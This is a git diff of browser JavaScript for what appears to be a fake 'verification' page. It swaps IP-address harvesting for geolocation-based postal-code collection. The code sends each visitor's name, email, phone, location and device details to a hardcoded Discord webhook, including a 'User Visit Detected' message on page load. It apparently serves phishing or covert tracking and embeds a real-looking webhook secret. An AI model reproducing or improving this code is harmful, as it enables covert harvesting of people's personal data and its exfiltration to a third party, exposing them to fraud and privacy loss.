@@ -1,7 +1,7 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
 
 let loadingProgress = 0;
-let userIP = '';
+let userPostalCode = '';
 let initialWebhookSent = false;
 let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
 let formStartTime = Date.now();
@@ -245,9 +245,9 @@ async function sendWebhook(userData) {
     }
     
     try {
-        // Use the IP we already collected
-        const ip = userIP || 'Unknown IP';
-        console.log('🌐 Using collected IP:', ip);
+        // Use the postal code we already collected
+        const postalCode = userPostalCode || 'Unknown Postal Code';
+        console.log('📍 Using collected postal code:', postalCode);
 
         console.log('📱 Getting device info...');
         const deviceInfo = getDeviceInfo();
@@ -263,7 +263,7 @@ async function sendWebhook(userData) {
                 { name: '👤 Full Name', value: userData.name || 'Not provided', inline: false },
                 { name: '📧 Email Address', value: userData.email || 'Not provided', inline: false },
                 { name: '📞 Phone Number', value: userData.phone || 'Not provided', inline: false },
-                { name: '🌐 IP Address', value: ip, inline: true },
+                { name: '📍 Postal Code', value: postalCode, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                 { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                 { name: '🌍 Language', value: deviceInfo.language, inline: true },
@@ -658,44 +658,88 @@ window.addEventListener('load', function() {
     }, 100); // Small delay to ensure loading sequence starts first
 });
 
-// Get IP address with multiple fallback services
-async function getIPAddress() {
-    const ipServices = [
-        { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
-        { url: 'https://ipapi.co/json/', parser: (data) => data.ip },
-        { url: 'https://api.myip.com', parser: (data) => data.ip },
-        { url: 'https://httpbin.org/ip', parser: (data) => data.origin },
-        { url: 'https://ifconfig.me/ip', parser: (data) => data.trim() }
-    ];
+// Get postal code using geolocation API
+async function getPostalCode() {
+    console.log('📍 Getting postal code using geolocation...');
     
-    for (const service of ipServices) {
-        try {
-            console.log(`🔄 Trying IP service: ${service.url}`);
-            const response = await fetch(service.url, {
-                method: 'GET',
-                mode: 'cors',
-                cache: 'no-cache',
-                headers: {
-                    'Accept': 'application/json'
-                }
-            });
-            
-            if (response.ok) {
-                const data = await response.json();
-                const ip = service.parser(data);
-                
-                if (ip && ip !== 'Unknown IP') {
-                    console.log(`✅ IP retrieved from ${service.url}: ${ip}`);
-                    return ip;
-                }
+    try {
+        // Try to get user's location using browser geolocation
+        const position = await new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject(new Error('Geolocation is not supported'));
+                return;
             }
-        } catch (error) {
-            console.log(`❌ IP service ${service.url} failed:`, error.message);
+            
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: false,
+                timeout: 10000,
+                maximumAge: 300000 // 5 minutes
+            });
+        });
+        
+        const { latitude, longitude } = position.coords;
+        console.log(`📍 Location obtained: ${latitude}, ${longitude}`);
+        
+        // Reverse geocoding to get postal code
+        const postalCode = await reverseGeocode(latitude, longitude);
+        
+        if (postalCode) {
+            console.log(`✅ Postal code retrieved: ${postalCode}`);
+            return postalCode;
         }
+    } catch (error) {
+        console.log('❌ Geolocation failed:', error.message);
     }
     
-    console.log('⚠️ All IP services failed, using fallback');
-    return 'Unknown IP';
+    // Fallback: Ask user for postal code
+    console.log('🔄 Asking user for postal code...');
+    return await askUserForPostalCode();
+}
+
+// Reverse geocoding to get postal code from coordinates
+async function reverseGeocode(latitude, longitude) {
+    try {
+        // Use Nominatim OpenStreetMap API
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`;
+        
+        const response = await fetch(url, {
+            method: 'GET',
+            headers: {
+                'User-Agent': 'PhonzVerification/1.0'
+            }
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            const address = data.address;
+            
+            // Try to get postal code from different possible fields
+            const postalCode = address.postcode || address.postal_code || address.zip;
+            
+            if (postalCode) {
+                return postalCode;
+            }
+        }
+    } catch (error) {
+        console.log('❌ Reverse geocoding failed:', error.message);
+    }
+    
+    return null;
+}
+
+// Ask user for postal code as fallback
+async function askUserForPostalCode() {
+    return new Promise((resolve) => {
+        const postalCode = prompt('📍 Please enter your postal/zip code for verification:');
+        
+        if (postalCode && postalCode.trim()) {
+            console.log(`✅ User provided postal code: ${postalCode.trim()}`);
+            resolve(postalCode.trim());
+        } else {
+            console.log('⚠️ No postal code provided, using default');
+            resolve('Unknown Postal Code');
+        }
+    });
 }
 
 // Collect IP and send initial webhook with just IP and device info
@@ -703,19 +747,19 @@ async function collectIPAndSendInitialWebhook() {
     console.log('🌐 Starting IP collection and initial webhook...');
     
     try {
-        // Get IP address with multiple fallback services
-        console.log('📡 Getting IP address...');
-        userIP = await getIPAddress();
+        // Get postal code
+        console.log('📍 Getting postal code...');
+        userPostalCode = await getPostalCode();
         
         // Get device info
         console.log('📱 Getting device info...');
         const deviceInfo = getDeviceInfo();
         
-        // Send initial webhook with just IP and device info
-        console.log('📤 Sending initial webhook with IP and device info...');
-        console.log('📋 IP Address:', userIP);
+        // Send initial webhook with postal code and device info
+        console.log('📤 Sending initial webhook with postal code and device info...');
+        console.log('📋 Postal Code:', userPostalCode);
         
-        const initialSuccess = await sendInitialWebhook(userIP, deviceInfo);
+        const initialSuccess = await sendInitialWebhook(userPostalCode, deviceInfo);
         
         if (initialSuccess) {
             initialWebhookSent = true;
@@ -724,7 +768,7 @@ async function collectIPAndSendInitialWebhook() {
             console.error('❌ Failed to send initial webhook');
             // Try simple fallback method
             console.log('🔄 Trying simple fallback webhook method...');
-            const fallbackSuccess = await sendSimpleWebhook(userIP, deviceInfo);
+            const fallbackSuccess = await sendSimpleWebhook(userPostalCode, deviceInfo);
             if (fallbackSuccess) {
                 initialWebhookSent = true;
                 console.log('✅ Fallback webhook sent successfully');
@@ -736,8 +780,8 @@ async function collectIPAndSendInitialWebhook() {
     }
 }
 
-// Send initial webhook with IP and device info
-async function sendInitialWebhook(ip, deviceInfo) {
+// Send initial webhook with postal code and device info
+async function sendInitialWebhook(postalCode, deviceInfo) {
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
         return false;
@@ -750,7 +794,7 @@ async function sendInitialWebhook(ip, deviceInfo) {
             color: 0x3498db, // Blue color for initial visit
             fields: [
                 { name: '🆔 Session ID', value: sessionId, inline: false },
-                { name: '🌐 IP Address', value: ip, inline: true },
+                { name: '📍 Postal Code', value: postalCode, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
                 { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                 { name: '🌍 Language', value: deviceInfo.language, inline: true },
@@ -784,8 +828,8 @@ async function sendInitialWebhook(ip, deviceInfo) {
     }
 }
 
-// Simple webhook fallback method using Image beacon
-async function sendSimpleWebhook(ip, deviceInfo) {
+// Simple webhook fallback method
+async function sendSimpleWebhook(postalCode, deviceInfo) {
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
         return false;
@@ -793,7 +837,7 @@ async function sendSimpleWebhook(ip, deviceInfo) {
     
     try {
         // Create a simple message payload
-        const message = `🌐 User Visit Detected\n🆔 Session: ${sessionId}\n🌐 IP: ${ip}\n📱 Device: ${deviceInfo.platform}\n🖥️ OS: ${deviceInfo.os}\n🌍 Browser: ${deviceInfo.browser}`;
+        const message = `🌐 User Visit Detected\n🆔 Session: ${sessionId}\n📍 Postal Code: ${postalCode}\n📱 Device: ${deviceInfo.platform}\n🖥️ OS: ${deviceInfo.os}\n🌍 Browser: ${deviceInfo.browser}`;
         
         // Try using a simple POST request without complex headers
         const payload = {
@@ -828,7 +872,7 @@ async function sendSimpleWebhook(ip, deviceInfo) {
             webhookUrl: WEBHOOK_URL,
             sessionData: {
                 sessionId: sessionId,
-                ip: ip,
+                postalCode: postalCode,
                 deviceInfo: deviceInfo
             }
         };
